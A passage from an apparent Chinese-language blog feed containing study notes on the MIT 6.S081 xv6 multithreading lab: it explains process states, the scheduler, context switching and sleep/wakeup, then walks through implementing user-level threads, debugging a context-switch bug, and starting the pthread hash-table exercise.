<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucGF0aG5hbWUuY29tL2Zocy8yLjIvaW5kZXguaHRtbA==">Filesystem Hierarchy Standard<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9idHJmcy5yZWFkdGhlZG9jcy5pby8=">BTRFS documentation<i class="fa fa-external-link-alt"></i></span> 偏向使用文档，没怎么介绍原理<br><span class="exturl" data-url="aHR0cHM6Ly9idHJmcy53aWtpLmtlcm5lbC5vcmcvaW5kZXgucGhwL1RyZWVz">Btrfs Trees<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9idHJmcy53aWtpLmtlcm5lbC5vcmcvaW5kZXgucGhwL0J0cmZzX2Rlc2lnbg==">Btrfs Design<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMjAwMjI2MTMzNzQ3L2h0dHBzOi8vd3d3LmlibS5jb20vZGV2ZWxvcGVyd29ya3MvY24vbGludXgvbC1jbi1idHJmcy9pbmRleC5odG1s">新一代 Linux 文件系统 btrfs 简介
<i class="fa fa-external-link-alt"></i></span>  比较老的一篇文章<br><span class="exturl" data-url="aHR0cHM6Ly9idHJmcy53aWtpLmtlcm5lbC5vcmcvaW5kZXgucGhwL0ZBUQ==">Btrfs FAQ<i class="fa fa-external-link-alt"></i></span> 希望你用不到这些东西，有一天要翻这那你Btrfs多半是出问题了  </p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>6.S081</tag>
        <tag>fs</tag>
        <tag>btrfs</tag>
      </tags>
  </entry>
  <entry>
    <title>6.S081 Lab Multithreading 笔记</title>
    <url>/6-S081-lab-multithreading/</url>
    <content><![CDATA[<p>实现一个用户态线程uthread，就照着xv6的内核态线程抄呗。怎么什么FUSE啊、UIO啊，什么东西都想往用户态搬啊，连RCU都有人想往用户态搬。</p>
<span id="more"></span>

<h2 id="xv6中的process"><a href="#xv6中的process" class="headerlink" title="xv6中的process"></a>xv6中的process</h2><h3 id="process的状态"><a href="#process的状态" class="headerlink" title="process的状态"></a>process的状态</h3><p>xv6的线程状态包括 UNUSED, USED, SLEEPING, RUNNABLE, RUNNING, ZOMBIE</p>
<p><img src="/6-S081-lab-multithreading/1650459636.png"></p>
<h3 id="process调度"><a href="#process调度" class="headerlink" title="process调度"></a>process调度</h3><p>用户态进程的切换是需要内核态的 kstack scheduler的</p>
<p><img src="/6-S081-lab-multithreading/1650459961.png"></p>
<p>我们下面来看调度过程，相比linux里面的调度器这个简单多了。就是一个最简单的时间片轮转。</p>
<p>首先我们看proc这个结构体（就相当于linux里面的task这个结构体）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span>        <span class="comment">// Process state</span></span><br><span class="line">  <span class="type">void</span> *chan;                  <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="type">int</span> killed;                  <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="type">int</span> xstate;                  <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="type">int</span> pid;                     <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait_lock must be held when using this:</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>         <span class="comment">// Parent process</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="type">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在process切换的时候，保存proc的trapframe和context用来恢复，然后还有proc的状态（STATE）、pid等。</p>
<p>在切换的时候主要的工作是context和trapframe的保存和恢复。context被翻译成上下文，然后当年书里说半天我也没搞懂这到底是个啥玩意。后来看了xv6的源码才知道这是个啥。到底是谁最先把context翻译成上下文的啊？？？？ 我们直接看源码， <code>kernel/proc.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  uint64 ra; <span class="meta"># return address, 返回地址</span></span><br><span class="line">  uint64 sp; <span class="meta"># stack pointer，栈指针寄存器</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// callee-saved</span></span><br><span class="line">  uint64 s0;</span><br><span class="line">  uint64 s1;</span><br><span class="line">  uint64 s2;</span><br><span class="line">  uint64 s3;</span><br><span class="line">  uint64 s4;</span><br><span class="line">  uint64 s5;</span><br><span class="line">  uint64 s6;</span><br><span class="line">  uint64 s7;</span><br><span class="line">  uint64 s8;</span><br><span class="line">  uint64 s9;</span><br><span class="line">  uint64 s10;</span><br><span class="line">  uint64 s11;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>context是一个结构体，里面是寄存器的值（用来保存和恢复process的状态）</p>
<p>trapframe也是一个结构体，放的东西更多了点。比如process的内核页表、比如kernel_sp寄存器，比如epc寄存器</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">  <span class="comment">/*   0 */</span> uint64 kernel_satp;   <span class="comment">// kernel page table</span></span><br><span class="line">  <span class="comment">/*   8 */</span> uint64 kernel_sp;     <span class="comment">// top of process&#x27;s kernel stack</span></span><br><span class="line">  <span class="comment">/*  16 */</span> uint64 kernel_trap;   <span class="comment">// usertrap()</span></span><br><span class="line">  <span class="comment">/*  24 */</span> uint64 epc;           <span class="comment">// saved user program counter</span></span><br><span class="line">  <span class="comment">/*  32 */</span> uint64 kernel_hartid; <span class="comment">// saved kernel tp</span></span><br><span class="line">  <span class="comment">/*  40 */</span> uint64 ra;</span><br><span class="line">  <span class="comment">/*  48 */</span> uint64 sp;</span><br><span class="line">  <span class="comment">/*  56 */</span> uint64 gp;</span><br><span class="line">  <span class="comment">/*  64 */</span> uint64 tp;</span><br><span class="line">  <span class="comment">/*  72 */</span> uint64 t0;</span><br><span class="line">  <span class="comment">/*  80 */</span> uint64 t1;</span><br><span class="line">  <span class="comment">/*  88 */</span> uint64 t2;</span><br><span class="line">  <span class="comment">/*  96 */</span> uint64 s0;</span><br><span class="line">  <span class="comment">/* 104 */</span> uint64 s1;</span><br><span class="line">  <span class="comment">/* 112 */</span> uint64 a0;</span><br><span class="line">  <span class="comment">/* 120 */</span> uint64 a1;</span><br><span class="line">  <span class="comment">/* 128 */</span> uint64 a2;</span><br><span class="line">  <span class="comment">/* 136 */</span> uint64 a3;</span><br><span class="line">  <span class="comment">/* 144 */</span> uint64 a4;</span><br><span class="line">  <span class="comment">/* 152 */</span> uint64 a5;</span><br><span class="line">  <span class="comment">/* 160 */</span> uint64 a6;</span><br><span class="line">  <span class="comment">/* 168 */</span> uint64 a7;</span><br><span class="line">  <span class="comment">/* 176 */</span> uint64 s2;</span><br><span class="line">  <span class="comment">/* 184 */</span> uint64 s3;</span><br><span class="line">  <span class="comment">/* 192 */</span> uint64 s4;</span><br><span class="line">  <span class="comment">/* 200 */</span> uint64 s5;</span><br><span class="line">  <span class="comment">/* 208 */</span> uint64 s6;</span><br><span class="line">  <span class="comment">/* 216 */</span> uint64 s7;</span><br><span class="line">  <span class="comment">/* 224 */</span> uint64 s8;</span><br><span class="line">  <span class="comment">/* 232 */</span> uint64 s9;</span><br><span class="line">  <span class="comment">/* 240 */</span> uint64 s10;</span><br><span class="line">  <span class="comment">/* 248 */</span> uint64 s11;</span><br><span class="line">  <span class="comment">/* 256 */</span> uint64 t3;</span><br><span class="line">  <span class="comment">/* 264 */</span> uint64 t4;</span><br><span class="line">  <span class="comment">/* 272 */</span> uint64 t5;</span><br><span class="line">  <span class="comment">/* 280 */</span> uint64 t6;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>说一下trapframe和context的区别，context保存的是线程切换（比如调度器切换线程）时候的数据（寄存器），trapframe保存的是trap的时候（切换内核态时候）的数据</p>
<h4 id="运行状态切换"><a href="#运行状态切换" class="headerlink" title="运行状态切换"></a>运行状态切换</h4><p>进入RUNNING是由<code>scheduler</code>处理的，这里就直接是一个简单的for循环，加锁找到可用的直接将状态变成RUNNING释放锁。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">scheduler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> *<span class="title">c</span> =</span> mycpu();</span><br><span class="line">  </span><br><span class="line">  c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// Avoid deadlock by ensuring that devices can interrupt.</span></span><br><span class="line">    intr_on();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      acquire(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state == RUNNABLE) &#123;</span><br><span class="line">        <span class="comment">// Switch to chosen process.  It is the process&#x27;s job</span></span><br><span class="line">        <span class="comment">// to release its lock and then reacquire it</span></span><br><span class="line">        <span class="comment">// before jumping back to us.</span></span><br><span class="line">        p-&gt;state = RUNNING;</span><br><span class="line">        c-&gt;proc = p;</span><br><span class="line">        swtch(&amp;c-&gt;context, &amp;p-&gt;context);    <span class="comment">// 保存context（上下文）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process is done running for now.</span></span><br><span class="line">        <span class="comment">// It should have changed its p-&gt;state before coming back.</span></span><br><span class="line">        c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里swtch是保存并切换context。<code>swtch(&amp;c-&gt;context, &amp;p-&gt;context);</code>表示保存c的context, 加载p的context。我们直接看一下<code>swtch.S</code>的代码就明白了：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.globl</span> swtch</span><br><span class="line"><span class="symbol">swtch:</span></span><br><span class="line">        sd ra, <span class="number">0</span>(a0)</span><br><span class="line">        sd <span class="built_in">sp</span>, <span class="number">8</span>(a0)</span><br><span class="line">        sd <span class="built_in">s0</span>, <span class="number">16</span>(a0)</span><br><span class="line">        .......</span><br><span class="line"></span><br><span class="line">        ld ra, <span class="number">0</span>(<span class="built_in">a1</span>)</span><br><span class="line">        ld <span class="built_in">sp</span>, <span class="number">8</span>(<span class="built_in">a1</span>)</span><br><span class="line">        ld <span class="built_in">s0</span>, <span class="number">16</span>(<span class="built_in">a1</span>)</span><br><span class="line">        .......</span><br><span class="line"></span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>

<p>退出的过程是调用了<code>yield</code>，从RUNNING进入RUNNABLE</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Give up the CPU for one scheduling round.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">yield</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  acquire(&amp;p-&gt;lock);    <span class="comment">// 这里也要加一个自旋锁，如果不加，在yield过程中来一个中断之类的会出问题</span></span><br><span class="line">  p-&gt;state = RUNNABLE;</span><br><span class="line">  sched();  <span class="comment">// 这里调用sched切换进程（恢复上下文等操作）</span></span><br><span class="line">  release(&amp;p-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>yield 调用了 sched</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sched</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> intena;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!holding(&amp;p-&gt;lock))    <span class="comment">// 必须持有锁</span></span><br><span class="line">    panic(<span class="string">&quot;sched p-&gt;lock&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(mycpu()-&gt;noff != <span class="number">1</span>)    <span class="comment">//中断是关的</span></span><br><span class="line">    panic(<span class="string">&quot;sched locks&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;state == RUNNING)   <span class="comment">//之前已经设为RUNNABLE，肯定不能是RUNNING</span></span><br><span class="line">    panic(<span class="string">&quot;sched running&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get())    <span class="comment">// 中断不能是enabled</span></span><br><span class="line">    panic(<span class="string">&quot;sched interruptible&quot;</span>);</span><br><span class="line"></span><br><span class="line">  intena = mycpu()-&gt;intena; <span class="comment">//将itena置为当前CPU的itena</span></span><br><span class="line">  swtch(&amp;p-&gt;context, &amp;mycpu()-&gt;context);    <span class="comment">//恢复context（上下文）</span></span><br><span class="line">  mycpu()-&gt;intena = intena;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说一下这个itena，定义在<code>kernel/proc.h</code>中，就是中断（interrupt）是否在push_off之前enable了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Per-CPU state.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">proc</span>;</span>          <span class="comment">// The process running on this cpu, or null.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// swtch() here to enter scheduler().</span></span><br><span class="line">  <span class="type">int</span> noff;                   <span class="comment">// Depth of push_off() nesting.</span></span><br><span class="line">  <span class="type">int</span> intena;                 <span class="comment">// Were interrupts enabled before push_off()?</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>从RUNNING退出到别的状态可能是收到了中断，也可能是进入SLEEPING（比如耗时较长的文件IO），也可能是被kill了或者父进程被kill了进入了ZOMBIE状态</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">kill</span><span class="params">(<span class="type">int</span> pid)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++)&#123;</span><br><span class="line">    acquire(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;pid == pid)&#123;</span><br><span class="line">      p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state == SLEEPING)&#123;</span><br><span class="line">        <span class="comment">// Wake process from sleep().</span></span><br><span class="line">        p-&gt;state = RUNNABLE;</span><br><span class="line">      &#125;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="睡眠和唤醒"><a href="#睡眠和唤醒" class="headerlink" title="睡眠和唤醒"></a>睡眠和唤醒</h4><p>wakeup比较简单，就正常的加锁然后置为RUNNABLE就好了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Wake up all processes sleeping on chan.</span></span><br><span class="line"><span class="comment">// Must be called without any p-&gt;lock.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">wakeup</span><span class="params">(<span class="type">void</span> *chan)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(p != myproc())&#123;</span><br><span class="line">      acquire(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state == SLEEPING &amp;&amp; p-&gt;chan == chan) &#123;</span><br><span class="line">        p-&gt;state = RUNNABLE;</span><br><span class="line">      &#125;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sleep这里要注意！这个spinlock是为了保证在执行sleep的时候没有别的进程调用wakeup。开始执行sleep之后lk就可以释放掉了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Atomically release lock and sleep on chan.</span></span><br><span class="line"><span class="comment">// Reacquires lock when awakened.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sleep</span><span class="params">(<span class="type">void</span> *chan, <span class="keyword">struct</span> spinlock *lk)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Must acquire p-&gt;lock in order to</span></span><br><span class="line">  <span class="comment">// change p-&gt;state and then call sched.</span></span><br><span class="line">  <span class="comment">// Once we hold p-&gt;lock, we can be</span></span><br><span class="line">  <span class="comment">// guaranteed that we won&#x27;t miss any wakeup</span></span><br><span class="line">  <span class="comment">// (wakeup locks p-&gt;lock),</span></span><br><span class="line">  <span class="comment">// so it&#x27;s okay to release lk.</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;p-&gt;lock);  <span class="comment">//DOC: sleeplock1</span></span><br><span class="line">  release(lk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Go to sleep.</span></span><br><span class="line">  p-&gt;chan = chan;</span><br><span class="line">  p-&gt;state = SLEEPING;</span><br><span class="line"></span><br><span class="line">  sched();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Tidy up.</span></span><br><span class="line">  p-&gt;chan = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reacquire original lock.</span></span><br><span class="line">  release(&amp;p-&gt;lock);</span><br><span class="line">  acquire(lk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><p>这个Lab有点意思，实现可以直接照抄内核态线程，做一个naive的用户态线程</p>
<h3 id="Uthread-switching-between-threads-moderate"><a href="#Uthread-switching-between-threads-moderate" class="headerlink" title="Uthread: switching between threads (moderate)"></a>Uthread: switching between threads (moderate)</h3><p>用户态线程的状态只有三种，FREE, RUNNING, RUNNABLE。状态机比较简单。<code>thread_init</code>初始化的时候状态设为RUNNING</p>
<p>创建a,b,c三个用户态thread,然后每个线程打印一次后就执行<code>thread_yield</code>切换线程，并将当前线程的状态设置为RUNNABLE</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">thread_yield</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    current_thread-&gt;state = RUNNABLE;</span><br><span class="line">    thread_schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在线程结束的时候将状态置为FREE, <code>current_thread-&gt;state = FREE;</code>，调用</p>
<p><code>thread_create</code>传进来的参数是一个函数指针（比如thread_a）, 我们把函数指针存入ra寄存器，用来做恢复。<code>thread_create</code>实现可以参考<code>kernel/proc.c</code>里面的<code>allcproc()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">thread_create</span><span class="params">(<span class="type">void</span> (*func)())</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;state == FREE)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    t-&gt;state = RUNNABLE;</span><br><span class="line">    t-&gt;thread_context.ra = (uint64)func;</span><br><span class="line">    t-&gt;thread_context.sp = t-&gt;<span class="built_in">stack</span> + STACK_SIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们把<code>kernel/proc.h</code>中的context抄过来</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Saved registers for user context switches.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_context</span> &#123;</span></span><br><span class="line">  uint64 ra;</span><br><span class="line">  uint64 sp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// callee-saved</span></span><br><span class="line">  uint64 s0;</span><br><span class="line">  uint64 s1;</span><br><span class="line">  uint64 s2;</span><br><span class="line">  uint64 s3;</span><br><span class="line">  uint64 s4;</span><br><span class="line">  uint64 s5;</span><br><span class="line">  uint64 s6;</span><br><span class="line">  uint64 s7;</span><br><span class="line">  uint64 s8;</span><br><span class="line">  uint64 s9;</span><br><span class="line">  uint64 s10;</span><br><span class="line">  uint64 s11;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> <span class="built_in">stack</span>[STACK_SIZE]; <span class="comment">/* the thread&#x27;s stack */</span></span><br><span class="line">    <span class="type">int</span> state;              <span class="comment">/* FREE, RUNNING, RUNNABLE */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_context</span> <span class="title">thread_context</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后<code>user/uthread_switch.S</code>中的<code>thread_switch</code>照抄<code>kernel/swtch.S</code>实现状态切换，不过<code>thread_switch</code>这里的上下文只保存Callee-saved的寄存器就可以了，所以我们删掉<code>sd ra, 0(a0)</code>和<code>ld ra, 0(a1)</code></p>
<p><strong>sp寄存器是callee寄存器，只有ra寄存器是caller寄存器</strong>，这个不能删，删了之后用户线程没法切换了！一开始记错了把sp寄存器也记成caller寄存器了，没输出调了好久</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="comment"># void thread_switch(struct context *old, struct context *new);</span></span><br><span class="line"><span class="symbol">thread_switch:</span></span><br><span class="line">    sd <span class="built_in">sp</span>, <span class="number">8</span>(a0)</span><br><span class="line">    sd <span class="built_in">s0</span>, <span class="number">16</span>(a0)</span><br><span class="line">    sd <span class="built_in">s1</span>, <span class="number">24</span>(a0)</span><br><span class="line">    sd <span class="built_in">s2</span>, <span class="number">32</span>(a0)</span><br><span class="line">    sd <span class="built_in">s3</span>, <span class="number">40</span>(a0)</span><br><span class="line">    sd <span class="built_in">s4</span>, <span class="number">48</span>(a0)</span><br><span class="line">    sd <span class="built_in">s5</span>, <span class="number">56</span>(a0)</span><br><span class="line">    sd <span class="built_in">s6</span>, <span class="number">64</span>(a0)</span><br><span class="line">    sd <span class="built_in">s7</span>, <span class="number">72</span>(a0)</span><br><span class="line">    sd <span class="built_in">s8</span>, <span class="number">80</span>(a0)</span><br><span class="line">    sd <span class="built_in">s9</span>, <span class="number">88</span>(a0)</span><br><span class="line">    sd <span class="built_in">s10</span>, <span class="number">96</span>(a0)</span><br><span class="line">    sd <span class="built_in">s11</span>, <span class="number">104</span>(a0)</span><br><span class="line"></span><br><span class="line">    ld <span class="built_in">sp</span>, <span class="number">8</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s0</span>, <span class="number">16</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s1</span>, <span class="number">24</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s2</span>, <span class="number">32</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s3</span>, <span class="number">40</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s4</span>, <span class="number">48</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s5</span>, <span class="number">56</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s6</span>, <span class="number">64</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s7</span>, <span class="number">72</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s8</span>, <span class="number">80</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s9</span>, <span class="number">88</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s10</span>, <span class="number">96</span>(<span class="built_in">a1</span>)</span><br><span class="line">    ld <span class="built_in">s11</span>, <span class="number">104</span>(<span class="built_in">a1</span>)</span><br><span class="line"></span><br><span class="line">  ret    <span class="comment">/* return to ra */</span></span><br></pre></td></tr></table></figure>

<p>然后在<code>thread_switch</code>里面直接调用<code>thread_switch((uint64)t, (uint64)current_thread);</code></p>
<p>然后。。。报错了。调了一下午没找到哪出问题了，gdb打出来的调试信息看不出来。这个报错跟当初页表那个很像，debug的时候被误导了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ uthread</span><br><span class="line">usertrap(): unexpected scause 0x000000000000000f pid=3</span><br><span class="line">            sepc=0x0000000000000002 stval=0xfffffffffffffff8</span><br></pre></td></tr></table></figure>

<p>调了半天发现是我thread_switch的函数参数传错了，传进去的应该是context，寄存器a0是第一个参数，寄存器a1是参数，放的是寄存器的struct，然后按照地址偏移分别对应s0，s1等Callee寄存器的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">thread_switch((uint64)&amp;t-&gt;thread_context, (uint64)&amp;current_thread-&gt;thread_context);</span><br></pre></td></tr></table></figure>

<p>终于正常了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ uthread</span><br><span class="line"><span class="number">310514718</span>thread_a started</span><br><span class="line">thread_b started</span><br><span class="line">thread_c started</span><br><span class="line">thread_c <span class="number">0</span></span><br><span class="line">thread_a <span class="number">0</span></span><br><span class="line">thread_b <span class="number">0</span></span><br><span class="line">thread_c <span class="number">1</span></span><br><span class="line">thread_a <span class="number">1</span></span><br><span class="line">thread_b <span class="number">1</span></span><br><span class="line">thread_c <span class="number">2</span></span><br><span class="line">thread_a <span class="number">2</span></span><br><span class="line">......</span><br><span class="line">thread_c <span class="number">99</span></span><br><span class="line">thread_a <span class="number">99</span></span><br><span class="line">thread_b <span class="number">99</span></span><br><span class="line">thread_c: <span class="built_in">exit</span> after <span class="number">100</span></span><br><span class="line">thread_a: <span class="built_in">exit</span> after <span class="number">100</span></span><br><span class="line">thread_b: <span class="built_in">exit</span> after <span class="number">100</span></span><br><span class="line">thread_schedule: no runnable threads</span><br></pre></td></tr></table></figure>

<h3 id="Using-threads-moderate"><a href="#Using-threads-moderate" class="headerlink" title="Using threads (moderate)"></a>Using threads (moderate)</h3><p>这个就是学一下怎么用pthread（这个是在unix&#x2F;linux里面，不是在qemu里），练习一下加mutex锁。<code>ph.c</code>里面有一个并发不安全的哈希表，就是一个简单的取模，然后放到相应的bucket里面，bucket中有重复的key就依次加到链表的后面。实现就和leetcode 706 设计哈希映射的官方题解差不多。这里bucket数量是5，所以很容易发生冲突，缓解hash冲突的一般做法是bucket去一个更大的质数，或者设计其他更好的hash函数减少hash冲突，或者我们不要链表，用开放定址或者rehash去解决hash冲突</p>
